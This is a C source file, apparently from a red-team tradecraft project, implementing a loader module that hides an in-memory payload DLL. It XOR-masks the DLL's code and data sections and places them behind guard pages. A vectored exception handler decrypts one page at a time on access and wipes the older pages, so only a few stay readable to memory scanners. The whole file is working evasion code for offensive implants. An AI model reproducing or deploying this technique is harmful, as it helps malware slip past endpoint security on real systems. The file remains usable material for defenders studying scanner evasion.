/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS Ã¢Â€ÂœAS ISÃ¢Â€Â AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
#include <windows.h>
#include "tcg.h"
 
WINBASEAPI PVOID WINAPI KERNEL32$AddVectoredExceptionHandler (ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
WINBASEAPI WINBOOL WINAPI KERNEL32$FlushInstructionCache (HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentThreadId (VOID);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);
 
#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);
 
#define MAXVISIBLE 3
#define MAXREGIONS 16
 
typedef struct {
    ULONG_PTR   start;
    ULONG_PTR   end;
    DWORD       permissions;
    char      * source;
} GUARDREGION;
 
typedef struct {
    char      * pages[MAXVISIBLE];
    int         index;
} REGIONQUEUE;
 
GUARDREGION regions[MAXREGIONS];
REGIONQUEUE state;
 
#define OLDESTPAGE() state.pages[state.index % MAXVISIBLE]
 
/* track our guard pages */
void TrackPage(ULONG_PTR page) {
    DWORD oldProt;
 
    if (OLDESTPAGE() != NULL) {
        dprintf("drop  page %p", OLDESTPAGE());
        KERNEL32$VirtualProtect(OLDESTPAGE(), 0x1000, PAGE_READWRITE, &oldProt);
        memset(OLDESTPAGE(), 0, 0x1000);
        KERNEL32$VirtualProtect(OLDESTPAGE(), 0x1000, PAGE_READWRITE | PAGE_GUARD, &oldProt);
    }
 
    OLDESTPAGE() = (char *)page;
    //dprintf("ADD   %p at index %d", OLDESTPAGE(), state.index);
 
    state.index = (state.index + 1) % MAXVISIBLE;
}
 
/* add a region to guard! */
void AddGuardRegion(char * payload, int len, char * src, DWORD permissions) {
    for (int x = 0; x < MAXREGIONS; x++) {
        if (regions[x].start == 0 && regions[x].end == 0) {
            dprintf("Setting up shop in %d for %p (%d) perms %d (SRC: %p)", x, payload, len, permissions, src);
 
            regions[x].start       = (ULONG_PTR)payload;
            regions[x].end         = (ULONG_PTR)payload + len;
            regions[x].source      = src;
            regions[x].permissions = permissions;
            return;
        }
    }
 
    dprintf("No empty guard regions!");
}
 
/* grab our guard region */
GUARDREGION * GetGuardRegion(ULONG_PTR address) {
    for (int x = 0; x < MAXREGIONS; x++) {
        if (address >= regions[x].start && address < regions[x].end)
            return & regions[x];
    }
 
    return NULL;
}
 
/*
 * a global variable with our xorkey, we're going to set this to a random value via
 * our loader.spec to demonstrate the 'patch' command applied to COFFs. Note, we set
 * this to a value, because 'patch' can't update an unintialized value.
 */
char xorkey[16] = { 1 };
 
/*
 * A simple routine to obfuscate and de-obfuscate memory with our payload stream data.
 */
void applyxor(char * data, DWORD len) {
    for (DWORD x = 0; x < len; x++) {
        data[x] ^= xorkey[x % 16];
    }
}
 
/*
 * Our VEH to response to page accesses and stream in content.
 */
LONG WINAPI VEHHandler(EXCEPTION_POINTERS * pExceptionPointers) {
    PEXCEPTION_RECORD ExceptionRecord = pExceptionPointers->ExceptionRecord;
    ULONG_PTR ExceptionAddress;
    ULONG_PTR PageAddress;
    DWORD oldprot;
    GUARDREGION * guard = NULL;
 
    /*
     * I break for guard pages.
     */
    if (ExceptionRecord->ExceptionCode != STATUS_GUARD_PAGE_VIOLATION)
        return EXCEPTION_CONTINUE_SEARCH;
 
    if (ExceptionRecord->NumberParameters < 2)
        return EXCEPTION_CONTINUE_SEARCH;
 
    /* pull the needed info our of the arguments */
    //AccessType       = ExceptionRecord->ExceptionInformation[0];
    ExceptionAddress = ExceptionRecord->ExceptionInformation[1];
    PageAddress      = ExceptionAddress - (ExceptionAddress % 0x1000);
 
    /* check if the exception occurred somewhere within our regions we're tracking */
    guard = GetGuardRegion(ExceptionAddress);
    if (guard == NULL) {
        dprintf("The exception occurred elsewhere: %p", ExceptionAddress);
        return EXCEPTION_CONTINUE_SEARCH;
    }
 
    //dprintf("[%p] We have a guard page violation exception!! %p FROM %p", KERNEL32$GetCurrentThreadId(), ExceptionAddress, ExceptionRecord->ExceptionAddress);
 
    if (guard->permissions == PAGE_EXECUTE_READ) {
        dprintf("LOAD  EXEC %p", PageAddress);
    }
    else {
        dprintf("LOAD  DATA %p", PageAddress);
    }
 
    /* make our target page writeable... */
    ULONG_PTR srcaddr = (ULONG_PTR)guard->source + (PageAddress - guard->start);
    KERNEL32$VirtualProtect((void *)PageAddress, 0x1000, PAGE_READWRITE, &oldprot);
 
    /* stream in ONE page of content from our payload */
    memcpy(PageAddress, srcaddr, 0x1000);
 
    /* unmask the page's contents */
    applyxor((char *)PageAddress, 0x1000);
 
    /* change the protection of our streamed in page to the permissions we want */
    KERNEL32$VirtualProtect((void *)PageAddress, 0x1000, guard->permissions, &oldprot);
 
    /* this seems like a REALLY good idea here */
    KERNEL32$FlushInstructionCache((HANDLE)-1, (void *)PageAddress, 0x1000);
 
    /* do the book keeping for this page */
    TrackPage(PageAddress);
 
    /* yeap, the exception is expected and handled... return to our code that was executing as if nothing happened */
    return EXCEPTION_CONTINUE_EXECUTION;
}
 
#define FLAG(x, y) ( ((x) & (y)) == (y) )
 
void GuardSections(DLLDATA * dll, char * dst, char * src) {
    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
    DWORD                   perms            = 0;
    DWORD                   oldprot;
 
    /* our first section! */
    sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);
 
    for (int x = 0; x < numberOfSections; x++) {
        perms = 0;
 
        /*
         * It's a bad idea to take our writeable memory and subject it to streaming. This will lead to some serious
         * confusion as variable updates, suddenly, become corrupted or aren't taking. Why? Because our stream src
         * is treated as a read-only/constant thing. This implementation doesn't patch updated content in a page
         * back into the stream src for retrieval later. It could, but I didn't feel like going there for now.
         */
        if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_WRITE)) {
            memcpy(dst + sectionHdr->VirtualAddress, src + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize);
            sectionHdr++;
            continue;
        }
 
        if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE))
            perms = PAGE_EXECUTE_READ;
        else
            perms = PAGE_READWRITE;
 
        /* since we're guarding this region, let's "obfuscate" the contents in our stream src */
        applyxor(src + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize);
 
        /* register this region of memory (and its permissions) in our guard table */
        AddGuardRegion(dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, src + sectionHdr->VirtualAddress, perms);
 
        /* And, the real magic, setting up guard pages */
        KERNEL32$VirtualProtect(dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, PAGE_READWRITE | PAGE_GUARD, &oldprot);
 
        /* advance to our next section */
        sectionHdr++;
    }
}
 
/* Set our guard exec shit up */
void go(DLLDATA * data, char * dstdll) {
    /* get our DLL size */
    int len = SizeOfDLL(data);
 
    /* initialize our regions to 0 */
    for (int x = 0; x < MAXREGIONS; x++) {
        regions[x].start = 0;
        regions[x].end   = 0;
    }
 
    /* initialize our state queue to 0 too */
    state.index = 0;
    for (int x = 0; x < MAXVISIBLE; x++)
        state.pages[x] = NULL;
 
    /* allocate our memory where our obfuscated, ready to restore, payload content will live */
    char * streamsrc = (char *)KERNEL32$VirtualAlloc( NULL, len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
 
    /* copy our payload content over to it! */
    memcpy(streamsrc, dstdll, len);
 
    /* set all of our sections to NULL, for now */
    memset(dstdll, 0, len);
 
    /* Now, we will walk the DLL, section by section, and setup guard regions and hints in our
     * global table keeping track of these things */
    GuardSections(data, dstdll, streamsrc);
 
    /* install the handler as our global VEH */
    KERNEL32$AddVectoredExceptionHandler(FALSE, (PVECTORED_EXCEPTION_HANDLER)VEHHandler);
}